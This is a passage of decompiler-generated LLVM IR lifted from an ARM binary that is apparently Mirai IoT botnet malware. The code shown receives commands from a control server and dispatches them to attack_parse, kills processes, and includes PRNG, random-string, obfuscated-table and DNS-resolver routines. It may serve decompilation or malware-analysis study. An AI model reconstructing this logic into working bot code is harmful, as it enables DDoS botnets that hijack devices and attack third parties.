  %v1_e21c = inttoptr i32 %v0_e21c to i32*
  %v2_e21c = load i32, i32* %v1_e21c, align 4
  store i32 %v2_e21c, i32* %r3.global-to-local, align 4
  %v7_e220 = icmp eq i32 %v2_e21c, 4
  br i1 %v7_e220, label %dec_label_pc_dddc, label %bb44

bb44:                                             ; preds = %dec_label_pc_e21c
  %v8_e224 = icmp eq i32 %v2_e21c, 11
  br i1 %v8_e224, label %dec_label_pc_dddc, label %dec_label_pc_e22c

dec_label_pc_e22c:                                ; preds = %dec_label_pc_e2b0, %bb44, %dec_label_pc_e044
  %v2_e22c = load i32, i32* @global_var_222e8.107, align 4
  store i32 57912, i32* @lr, align 4
  %v1_e234 = icmp ne i32 %v2_e22c, -1
  call void @__pseudo_cond_branch(i1 %v1_e234, i32 ptrtoint (i32* @global_var_14ab0.112 to i32))
  store i32 ptrtoint (i32* @global_var_222e8.107 to i32), i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @global_var_222e8.107, align 4
  %v1_e248 = call i32 @sleep(i32 1)
  br label %dec_label_pc_dddc

dec_label_pc_e250:                                ; preds = %dec_label_pc_e170
  %v2_e254 = call i32 @kill(i32 %v2_e1a4, i32 9)
  br label %dec_label_pc_e1b0

dec_label_pc_e25c:                                ; preds = %dec_label_pc_e04c
  %v3_e25c = udiv i32 %v4_e050, 256
  %v1_e260 = urem i32 %v4_e050, 256
  store i32 %v1_e260, i32* %r3.global-to-local, align 4
  %v4_e264 = mul nuw nsw i32 %v1_e260, 256
  %v5_e264 = or i32 %v4_e264, %v3_e25c
  %v6_e264 = trunc i32 %v5_e264 to i16
  store i32 %v5_e264, i32* %r2.global-to-local, align 4
  store i32 %v2_df08, i32* @lr, align 4
  %v7_e270 = inttoptr i32 %v5_e264 to i8*
  store i8* %v7_e270, i8** %stack_var_-42, align 4
  %tmp45 = icmp ult i16 %v6_e264, 1025
  br i1 %tmp45, label %dec_label_pc_e28c, label %dec_label_pc_e278

dec_label_pc_e278:                                ; preds = %dec_label_pc_e25c
  %v2_e278 = load i32, i32* @global_var_222e8.107, align 4
  %v1_e27c = call i32 @__GI___libc_close(i32 %v2_e278)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_e284 = load i32, i32* @r8, align 4
  %v2_e284 = inttoptr i32 %v1_e284 to i32*
  store i32 -1, i32* %v2_e284, align 4
  br label %dec_label_pc_dddc

dec_label_pc_e28c:                                ; preds = %dec_label_pc_e25c
  %v0_e28c = load i32, i32* @r4, align 4
  %v1_e28c = load i32, i32* @r5, align 4
  %v2_e28c = inttoptr i32 %v1_e28c to i32*
  store i32 %v0_e28c, i32* %v2_e28c, align 4
  store i32 %v2_e294, i32* @r4, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_e29c = load i32, i32* @global_var_222e8.107, align 4
  %v7_e2a4 = call i32 @__libc_recv(i32 %v2_e29c, i32 %v2_e294, i32 %v5_e264, i32 16386)
  %v7_e2a8 = icmp eq i32 %v7_e2a4, -1
  br i1 %v7_e2a8, label %dec_label_pc_e21c, label %dec_label_pc_e2b0

dec_label_pc_e2b0:                                ; preds = %dec_label_pc_e28c
  %v2_e2b0 = icmp eq i32 %v7_e2a4, 0
  br i1 %v2_e2b0, label %dec_label_pc_e22c, label %dec_label_pc_e2b8

dec_label_pc_e2b8:                                ; preds = %dec_label_pc_e2b0
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_e2c4 = load i32, i32* @global_var_222e8.107, align 4
  %v4_e2c8 = call i32 @__libc_recv(i32 %v2_e2c4, i32 %v2_e0ec, i32 2, i32 16384)
  %v3_e2d0 = load i8*, i8** %stack_var_-42, align 4
  %v4_e2d0 = ptrtoint i8* %v3_e2d0 to i32
  %v3_e2d4 = udiv i32 %v4_e2d0, 256
  %v1_e2d8 = mul i32 %v4_e2d0, 256
  %v4_e2dc = and i32 %v1_e2d8, 65280
  %v5_e2dc = or i32 %v4_e2dc, %v3_e2d4
  store i32 %v5_e2dc, i32* %ip.global-to-local, align 4
  store i32 %v2_df08, i32* @lr, align 4
  store i32 %v5_e2dc, i32* %r2.global-to-local, align 4
  %v2_e2ec = load i32, i32* @global_var_222e8.107, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_e2f4 = inttoptr i32 %v5_e2dc to i8*
  store i8* %v6_e2f4, i8** %stack_var_-42, align 4
  %v6_e2f8 = call i32 @__libc_recv(i32 %v2_e2ec, i32 %v2_e294, i32 %v5_e2dc, i32 16384)
  store i32 %v2_df08, i32* %r2.global-to-local, align 4
  %v3_e300 = load i8*, i8** %stack_var_-42, align 4
  %v3_e304 = icmp eq i8* %v3_e300, null
  br i1 %v3_e304, label %dec_label_pc_dddc, label %dec_label_pc_e30c

dec_label_pc_e30c:                                ; preds = %dec_label_pc_e2b8
  %v4_e300 = ptrtoint i8* %v3_e300 to i32
  %v5_e310 = call i32 @attack_parse(i32* nonnull %stack_var_-1432, i32 %v4_e300, i32 %v2_df08)
  br label %dec_label_pc_dddc

; uselistorder directives
  uselistorder i8* %v3_e300, { 1, 0 }
  uselistorder i32 %v5_e2dc, { 1, 0, 2, 3 }
  uselistorder i32 %v7_e2a4, { 1, 0 }
  uselistorder i32 %v5_e264, { 1, 0, 3, 2 }
  uselistorder i32 %v3_e080, { 1, 3, 2, 0 }
  uselistorder i32 %v4_e050, { 1, 0, 2, 3 }
  uselistorder i32 %v4_e038, { 1, 0 }
  uselistorder i32 %v2_dfdc, { 6, 3, 2, 0, 1, 5, 4 }
  uselistorder i32 %v2_df1c, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-1436.1, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_df04, { 1, 0, 2 }
  uselistorder i32 %v5_ded0, { 1, 2, 0 }
  uselistorder i32 %v2_de1c, { 2, 1, 0 }
  uselistorder i32 %v1_de0c, { 1, 2, 0 }
  uselistorder i32 %v1_ddf0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-1436.0, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v2_e108, { 1, 0, 2, 3 }
  uselistorder i32 %v2_e0ec, { 3, 0, 5, 4, 2, 1 }
  uselistorder i32 %v2_e0e4, { 1, 0 }
  uselistorder i32 %v2_df08, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v2_ddd8, { 1, 0, 2 }
  uselistorder i32 %v2_dc7c, { 0, 12, 1, 13, 2, 11, 3, 10, 4, 5, 9, 8, 6, 14, 7 }
  uselistorder i32 %v2_dc68, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-64, { 1, 0, 2 }
  uselistorder i32* %stack_var_-152, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i8** %stack_var_-42, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 26, 27, 28, 30, 29, 33, 31, 32, 24, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 7, 8, 9, 5, 6, 10, 11 }
  uselistorder i32* @global_var_22464.97, { 1, 2, 0 }
  uselistorder i8* null, { 0, 2, 1 }
  uselistorder i32 16386, { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint (i8** @global_var_22468.110 to i32), { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_22468.110 to i8*), { 0, 1, 3, 2 }
  uselistorder i32* @global_var_222e4.88, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9 }
  uselistorder i32* @global_var_222e8.107, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 (i32)* @watchdog_maintain, { 1, 0 }
  uselistorder i32 (i32)* @killer_init, { 1, 0 }
  uselistorder i32 (i32)* @attack_init, { 1, 0 }
  uselistorder i32 (i32, i32)* @rand_alpha_str, { 2, 1, 0 }
  uselistorder i32* @global_var_222ec.86, { 2, 0, 3, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_da10.84 to i32), { 0, 2, 1 }
  uselistorder i32 ptrtoint (i16** @global_var_24f84.93 to i32), { 0, 1, 3, 2 }
  uselistorder i32 (i32, i32)* @bsd_signal, { 1, 0 }
  uselistorder label %dec_label_pc_e1b8, { 1, 0 }
  uselistorder label %dec_label_pc_e1b0, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_df18, { 2, 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_de5c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_de4c, { 1, 0 }
  uselistorder label %dec_label_pc_dddc, { 7, 1, 8, 9, 2, 0, 10, 3, 11, 12, 4, 5, 13, 6, 14 }
  uselistorder label %dec_label_pc_dc3c, { 2, 0, 1 }
}

define i32 @function_e340(i32 %arg1, i64* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_e340:
  %v0_e340 = load i1, i1* @cpsr_c, align 1
  call void @__pseudo_cond_branch(i1 %v0_e340, i32 -22311436)
  %v0_e348 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e348, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_e340
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_e340, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @rand_next() local_unnamed_addr {
entry:
  %v2_e35c = load i32, i32* @global_var_2246c.119, align 4
  %v2_e360 = load i32, i32* @global_var_22478.121, align 4
  %v4_e36c = mul i32 %v2_e35c, 2048
  %v5_e36c = xor i32 %v4_e36c, %v2_e35c
  store i32 %v5_e36c, i32* @r3, align 4
  %v4_e370 = udiv i32 %v2_e360, 524288
  %v5_e370 = xor i32 %v4_e370, %v2_e360
  %v2_e374 = load i32, i32* @global_var_22470.123, align 4
  %v2_e378 = load i32, i32* @global_var_22474.125, align 4
  %v2_e37c = xor i32 %v5_e370, %v5_e36c
  %v4_e380 = udiv i32 %v5_e36c, 256
  %v5_e380 = xor i32 %v2_e37c, %v4_e380
  store i32 %v2_e374, i32* @global_var_2246c.119, align 4
  store i32 %v2_e378, i32* @global_var_22470.123, align 4
  store i32 %v2_e360, i32* @global_var_22474.125, align 4
  store i32 %v5_e380, i32* @global_var_22478.121, align 4
  ret i32 %v5_e380

; uselistorder directives
  uselistorder i32 %v2_e360, { 2, 1, 0 }
  uselistorder i32 %v2_e35c, { 1, 0 }
}

define i32 @rand_init(i32 %arg1) local_unnamed_addr {
entry:
  %v2_e3b8 = call i32 @__GI_time(i32* null)
  store i32 %v2_e3b8, i32* @global_var_2246c.119, align 4
  %v1_e3c4 = call i32 @__getpid(i32 %v2_e3b8)
  store i32 %v1_e3c4, i32* @r0, align 4
  %v0_e3cc = call i32 @getppid()
  %v2_e3d4 = xor i32 %v1_e3c4, %v0_e3cc
  store i32 %v2_e3d4, i32* @global_var_22470.123, align 4
  %v1_e3dc = call i32 @clock(i32 %v2_e3d4)
  %v2_e3e0 = load i32, i32* @global_var_22470.123, align 4
  %v2_e3ec = xor i32 %v2_e3e0, %v1_e3dc
  store i32 %v2_e3ec, i32* @global_var_22478.121, align 4
  store i32 %v1_e3dc, i32* @global_var_22474.125, align 4
  ret i32 %v1_e3dc

; uselistorder directives
  uselistorder i32 %v1_e3dc, { 1, 2, 0 }
  uselistorder i32 ()* @getppid, { 2, 1, 0 }
  uselistorder i32 (i32)* @__getpid, { 2, 1, 0 }
}

define i32 @rand_alpha_str(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_e414 = load i32, i32* @r4, align 4
  %v6_e414 = load i32, i32* @r5, align 4
  %v9_e414 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v1_e428 = call i32 @table_unlock_val(i32 33)
  %v3_e434 = call i32 @table_retrieve_val(i32 33, i32* null)
  store i32 %v3_e434, i32* @r1, align 4
  %v2_e440 = bitcast i32* %stack_var_-72 to i8*
  %v3_e440 = call i32 @strcpy(i8* %v2_e440, i32 %v3_e434)
  %v2_e444 = icmp eq i32 %arg2, 0
  br i1 %v2_e444, label %dec_label_pc_e4c0, label %dec_label_pc_e44c

dec_label_pc_e44c:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_2246c.119 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22470.123 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22474.125 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22478.121 to i32), i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v2_e4a4 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_e460

dec_label_pc_e460:                                ; preds = %dec_label_pc_e460.dec_label_pc_e460_crit_edge, %dec_label_pc_e44c
  %v1_e484 = phi i32 [ %v1_e484.pre, %dec_label_pc_e460.dec_label_pc_e460_crit_edge ], [ ptrtoint (i32* @global_var_2246c.119 to i32), %dec_label_pc_e44c ]
  %v2_e460 = load i32, i32* @global_var_22478.121, align 4
  store i32 %v2_e460, i32* %r2.global-to-local, align 4
  %v2_e464 = load i32, i32* @global_var_2246c.119, align 4
  %v4_e468 = udiv i32 %v2_e460, 524288
  %v5_e468 = xor i32 %v4_e468, %v2_e460
  %v4_e46c = mul i32 %v2_e464, 2048
  %v5_e46c = xor i32 %v4_e46c, %v2_e464
  %v2_e470 = xor i32 %v5_e468, %v5_e46c
  %v2_e474 = load i32, i32* @global_var_22470.123, align 4
  %v2_e478 = load i32, i32* @global_var_22474.125, align 4
  store i32 %v2_e478, i32* %ip.global-to-local, align 4
  %v4_e47c = udiv i32 %v5_e46c, 256
  %v5_e47c = xor i32 %v2_e470, %v4_e47c
  store i32 %v5_e47c, i32* @r4, align 4
  %v2_e484 = inttoptr i32 %v1_e484 to i32*
  store i32 %v2_e474, i32* %v2_e484, align 4
  %v0_e488 = load i32, i32* %ip.global-to-local, align 4
  %v1_e488 = load i32, i32* %r8.global-to-local, align 4
  %v2_e488 = inttoptr i32 %v1_e488 to i32*
  store i32 %v0_e488, i32* %v2_e488, align 4
  %v0_e48c = load i32, i32* %r2.global-to-local, align 4
  %v1_e48c = load i32, i32* %r7.global-to-local, align 4
  %v2_e48c = inttoptr i32 %v1_e48c to i32*
  store i32 %v0_e48c, i32* %v2_e48c, align 4
  %v0_e490 = load i32, i32* @r4, align 4
  %v1_e490 = load i32, i32* @r6, align 4
  %v2_e490 = inttoptr i32 %v1_e490 to i32*
  store i32 %v0_e490, i32* %v2_e490, align 4
  %v2_e494 = call i32 @util_strlen(i8* %v2_e440)
  %v0_e49c = load i32, i32* @r4, align 4
  %v3_e4a0 = urem i32 %v0_e49c, %v2_e494
  %v2_e4a8 = add i32 %v3_e4a0, %v2_e4a4
  %v1_e4ac = add i32 %v2_e4a8, -32
  %v2_e4ac = inttoptr i32 %v1_e4ac to i8*
  %v3_e4ac = load i8, i8* %v2_e4ac, align 1
  %v2_e4b0 = load i32, i32* @r5, align 4
  %v3_e4b0 = load i32, i32* %fp.global-to-local, align 4
  %v4_e4b0 = add i32 %v3_e4b0, %v2_e4b0
  %v5_e4b0 = inttoptr i32 %v4_e4b0 to i8*
  store i8 %v3_e4ac, i8* %v5_e4b0, align 1
  %v0_e4b4 = load i32, i32* @r5, align 4
  %v1_e4b4 = add i32 %v0_e4b4, 1
  store i32 %v1_e4b4, i32* @r5, align 4
  %v1_e4b8 = load i32, i32* %sb.global-to-local, align 4
  %v9_e4b8 = icmp eq i32 %v1_e4b4, %v1_e4b8
  br i1 %v9_e4b8, label %dec_label_pc_e4c0, label %dec_label_pc_e460.dec_label_pc_e460_crit_edge

dec_label_pc_e460.dec_label_pc_e460_crit_edge:    ; preds = %dec_label_pc_e460
  %v1_e484.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_e460

dec_label_pc_e4c0:                                ; preds = %dec_label_pc_e460, %entry
  %v1_e4c4 = call i32 @table_lock_val(i32 33)
  store i32 %v3_e414, i32* @r4, align 4
  store i32 %v6_e414, i32* @r5, align 4
  store i32 %v9_e414, i32* @r6, align 4
  ret i32 %v1_e4c4

; uselistorder directives
  uselistorder i32 %v2_e464, { 1, 0 }
  uselistorder i32 %v2_e460, { 1, 0, 2 }
}

define i32 @rand_str(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_e4e4 = load i32, i32* %r1.global-to-local, align 4
  %v3_e4e8 = load i32, i32* @r4, align 4
  store i32 %v3_e4e8, i32* %stack_var_-28, align 4
  %v0_e4ec = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e4ec, i32* %r5.global-to-local, align 4
  %tmp16 = icmp slt i32 %v0_e4e4, 1
  br i1 %tmp16, label %dec_label_pc_e594, label %dec_label_pc_e4f4

dec_label_pc_e4f4:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_22478.121 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22474.125 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22470.123 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2246c.119 to i32), i32* %r6.global-to-local, align 4
  %v2_e504 = load i32, i32* @global_var_22478.121, align 4
  store i32 %v2_e504, i32* %lr.global-to-local, align 4
  %v2_e508 = load i32, i32* @global_var_22474.125, align 4
  store i32 %v2_e508, i32* %r4.global-to-local, align 4
  %v2_e50c = load i32, i32* @global_var_22470.123, align 4
  store i32 %v2_e50c, i32* %r0.global-to-local, align 4
  %v2_e510 = load i32, i32* @global_var_2246c.119, align 4
  br label %dec_label_pc_e534

dec_label_pc_e518:                                ; preds = %dec_label_pc_e554
  %v1_e518 = trunc i32 %v5_e544 to i16
  %v3_e518 = inttoptr i32 %v9_e548 to i16*
  store i16 %v1_e518, i16* %v3_e518, align 2
  %v4_e518 = load i32, i32* %r5.global-to-local, align 4
  %v5_e518 = add i32 %v4_e518, -2
  store i32 %v5_e518, i32* %r5.global-to-local, align 4
  %v0_e51c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e51c

dec_label_pc_e51c:                                ; preds = %.thread, %dec_label_pc_e518
  %v0_e51c = phi i32 [ %v9_e54c, %.thread ], [ %v0_e51c.pre, %dec_label_pc_e518 ]
  %v2_e5185 = phi i32 [ %v12_e548, %.thread ], [ %v5_e518, %dec_label_pc_e518 ]
  %tmp17 = icmp slt i32 %v0_e51c, 1
  br i1 %tmp17, label %dec_label_pc_e59c, label %dec_label_pc_e528

dec_label_pc_e528:                                ; preds = %dec_label_pc_e51c
  %v0_e520 = load i32, i32* %r0.global-to-local, align 4
  %v0_e528 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e528, i32* %r0.global-to-local, align 4
  %v0_e52c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v0_e52c, i32* %r4.global-to-local, align 4
  %v0_e530 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_e530, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_e534

dec_label_pc_e534:                                ; preds = %dec_label_pc_e4f4, %dec_label_pc_e528
  %v0_e580 = phi i32 [ %v2_e50c, %dec_label_pc_e4f4 ], [ %v0_e528, %dec_label_pc_e528 ]
  %v9_e548 = phi i32 [ %v0_e4ec, %dec_label_pc_e4f4 ], [ %v2_e5185, %dec_label_pc_e528 ]
  %v0_e560 = phi i32 [ %v0_e4e4, %dec_label_pc_e4f4 ], [ %v0_e51c, %dec_label_pc_e528 ]
  %v0_e574 = phi i32 [ %v2_e504, %dec_label_pc_e4f4 ], [ %v0_e530, %dec_label_pc_e528 ]
  %v0_e570 = phi i32 [ %v2_e510, %dec_label_pc_e4f4 ], [ %v0_e520, %dec_label_pc_e528 ]
  %v4_e534 = mul i32 %v0_e570, 2048
  %v5_e534 = xor i32 %v4_e534, %v0_e570
  %v4_e538 = udiv i32 %v0_e574, 524288
  %v5_e538 = xor i32 %v4_e538, %v0_e574
  %v2_e53c = xor i32 %v5_e538, %v5_e534
  %v4_e544 = udiv i32 %v5_e534, 256
  %v5_e544 = xor i32 %v2_e53c, %v4_e544
  store i32 %v5_e544, i32* %r3.global-to-local, align 4
  %v7_e548 = icmp sgt i32 %v0_e560, 3
  br i1 %v7_e548, label %.thread, label %dec_label_pc_e554

.thread:                                          ; preds = %dec_label_pc_e534
  %v10_e548 = inttoptr i32 %v9_e548 to i32*
  store i32 %v5_e544, i32* %v10_e548, align 4
  %v11_e548 = load i32, i32* %r5.global-to-local, align 4
  %v12_e548 = add i32 %v11_e548, 4
  store i32 %v12_e548, i32* %r5.global-to-local, align 4
  %v8_e54c = load i32, i32* %r1.global-to-local, align 4
  %v9_e54c = add i32 %v8_e54c, -4
  store i32 %v9_e54c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e51c

dec_label_pc_e554:                                ; preds = %dec_label_pc_e534
  %v7_e560 = icmp eq i32 %v0_e560, 1
  store i32 %v5_e544, i32* %r3.global-to-local, align 4
  %v1_e568 = add i32 %v0_e560, -2
  store i32 %v1_e568, i32* %r1.global-to-local, align 4
  br i1 %v7_e560, label %dec_label_pc_e570, label %dec_label_pc_e518

dec_label_pc_e570:                                ; preds = %dec_label_pc_e554
  store i32 %v5_e544, i32* %r3.global-to-local, align 4
  %v1_e580 = load i32, i32* %r6.global-to-local, align 4
  %v2_e580 = inttoptr i32 %v1_e580 to i32*
  store i32 %v0_e580, i32* %v2_e580, align 4
  %v0_e584 = load i32, i32* %r4.global-to-local, align 4
  %v1_e584 = load i32, i32* %r7.global-to-local, align 4
  %v2_e584 = inttoptr i32 %v1_e584 to i32*
  store i32 %v0_e584, i32* %v2_e584, align 4
  %v0_e588 = load i32, i32* %lr.global-to-local, align 4
  %v1_e588 = load i32, i32* %r8.global-to-local, align 4
  %v2_e588 = inttoptr i32 %v1_e588 to i32*
  store i32 %v0_e588, i32* %v2_e588, align 4
  %v0_e58c = load i32, i32* %r3.global-to-local, align 4
  %v1_e58c = load i32, i32* %sl.global-to-local, align 4
  %v2_e58c = inttoptr i32 %v1_e58c to i32*
  store i32 %v0_e58c, i32* %v2_e58c, align 4
  %v0_e590 = load i32, i32* %r3.global-to-local, align 4
  %v1_e590 = trunc i32 %v0_e590 to i8
  %v2_e590 = load i32, i32* %r5.global-to-local, align 4
  %v3_e590 = inttoptr i32 %v2_e590 to i8*
  store i8 %v1_e590, i8* %v3_e590, align 1
  br label %dec_label_pc_e594

dec_label_pc_e594:                                ; preds = %entry, %dec_label_pc_e59c, %dec_label_pc_e570
  %v2_e594 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_e594, i32* @r4, align 4
  %v1_e598 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_e598

dec_label_pc_e59c:                                ; preds = %dec_label_pc_e51c
  %v0_e59c = load i32, i32* %r3.global-to-local, align 4
  %v1_e59c = load i32, i32* %sl.global-to-local, align 4
  %v2_e59c = inttoptr i32 %v1_e59c to i32*
  store i32 %v0_e59c, i32* %v2_e59c, align 4
  %v0_e5a0 = load i32, i32* %lr.global-to-local, align 4
  %v1_e5a0 = load i32, i32* %r8.global-to-local, align 4
  %v2_e5a0 = inttoptr i32 %v1_e5a0 to i32*
  store i32 %v0_e5a0, i32* %v2_e5a0, align 4
  %v0_e5a4 = load i32, i32* %r4.global-to-local, align 4
  %v1_e5a4 = load i32, i32* %r7.global-to-local, align 4
  %v2_e5a4 = inttoptr i32 %v1_e5a4 to i32*
  store i32 %v0_e5a4, i32* %v2_e5a4, align 4
  %v0_e5a8 = load i32, i32* %r0.global-to-local, align 4
  %v1_e5a8 = load i32, i32* %r6.global-to-local, align 4
  %v2_e5a8 = inttoptr i32 %v1_e5a8 to i32*
  store i32 %v0_e5a8, i32* %v2_e5a8, align 4
  br label %dec_label_pc_e594

; uselistorder directives
  uselistorder i32 %v9_e54c, { 1, 0 }
  uselistorder i32 %v12_e548, { 1, 0 }
  uselistorder i32 %v5_e544, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_e570, { 1, 0 }
  uselistorder i32 %v0_e574, { 1, 0 }
  uselistorder i32 %v0_e560, { 1, 0, 2 }
  uselistorder i32 %v0_e51c, { 1, 0 }
  uselistorder i32 %v0_e4e4, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 4, 0, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 4, 0, 1, 2, 3, 6, 5 }
  uselistorder i32* %r1.global-to-local, { 3, 5, 4, 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 2, 5, 6, 0, 1 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* @global_var_2246c.119, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_2246c.119 to i32), { 1, 0, 2 }
  uselistorder i32* @global_var_22470.123, { 2, 3, 6, 4, 1, 0, 5 }
  uselistorder i32* @global_var_22474.125, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32* @global_var_22478.121, { 2, 3, 5, 1, 0, 4 }
  uselistorder label %dec_label_pc_e594, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e534, { 1, 0 }
}

define i32 @resolv_entries_free(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_e5c0 = load i32, i32* @r4, align 4
  store i32 %v3_e5c0, i32* %stack_var_-8, align 4
  %v6_e5c0 = load i32, i32* @lr, align 4
  %v0_e5c4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e5c4, i32* @r4, align 4
  %v2_e5c4 = icmp eq i32 %v0_e5c4, 0
  br i1 %v2_e5c4, label %dec_label_pc_e5e0, label %dec_label_pc_e5cc

dec_label_pc_e5cc:                                ; preds = %entry
  %v1_e5cc = add i32 %v0_e5c4, 4
  %v2_e5cc = inttoptr i32 %v1_e5cc to i32*
  %v3_e5cc = load i32, i32* %v2_e5cc, align 4
  store i32 %v3_e5cc, i32* %r0.global-to-local, align 4
  store i32 58840, i32* @lr, align 4
  %v1_e5d4 = icmp ne i32 %v3_e5cc, 0
  call void @__pseudo_cond_branch(i1 %v1_e5d4, i32 ptrtoint (i32* @global_var_135dc.33 to i32))
  %v0_e5d8 = load i32, i32* @r4, align 4
  store i32 %v0_e5d8, i32* @r0, align 4
  %v0_e5dc = call i32 @free()
  store i32 %v0_e5dc, i32* %r0.global-to-local, align 4
  %v2_e5e0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_e5e0

dec_label_pc_e5e0:                                ; preds = %entry, %dec_label_pc_e5cc
  %v1_e5e4 = phi i32 [ 0, %entry ], [ %v0_e5dc, %dec_label_pc_e5cc ]
  %v2_e5e0 = phi i32 [ %v3_e5c0, %entry ], [ %v2_e5e0.pre, %dec_label_pc_e5cc ]
  store i32 %v2_e5e0, i32* @r4, align 4
  store i32 %v6_e5c0, i32* @lr, align 4
  ret i32 %v1_e5e4

; uselistorder directives
  uselistorder i32 %v0_e5c4, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_e5e0, { 1, 0 }
}

define i32 @resolv_lookup(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp79 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-4280 = alloca i32, align 4
  %stack_var_-4292 = alloca i16, align 2
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-2230 = alloca i32, align 4
  %stack_var_-2244 = alloca i16, align 2
  %stack_var_-2232 = alloca i32, align 4
